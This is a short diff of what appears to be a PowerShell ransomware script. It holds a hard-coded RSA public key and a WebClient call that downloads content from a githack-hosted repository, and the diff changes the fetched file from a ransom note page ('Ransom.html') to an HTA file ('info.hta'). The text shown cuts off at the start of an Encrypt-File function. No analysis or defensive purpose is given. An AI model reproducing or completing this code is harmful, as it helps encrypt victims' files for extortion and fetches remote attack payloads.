@@ -1,6 +1,6 @@
 $web = New-Object Net.WebClient
 $key = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCvXIGeuwHQzt0XVyRBA9/bCK7j9b4celVVd5ATSr/6Ev6QiBagf+d11l71Eqhznddzgi5+hEB+j5VPJq+4EjdD7JLnVjd/kxd4xkCFjkWsjEY9Vh41kZDoB3F0z92zkwHIx/wVtJJdq6vUX1Q9TMSRjQrA+XpdotSU+2Q/lBP12QIDAQAB"
-$text = $web.DownloadString("https://rawcdn.githack.com/hassanwalikhan/isp/6375a871ac06e822677549a1dcd41cb05febb3fe/Ransom.html")
+$text = $web.DownloadString("https://rawcdn.githack.com/hassanwalikhan/isp/9625c65cd1a3ecb11b2f3f3657739032f101a01e/info.hta")
 
 function Encrypt-File($String, $Passphrase)
 {
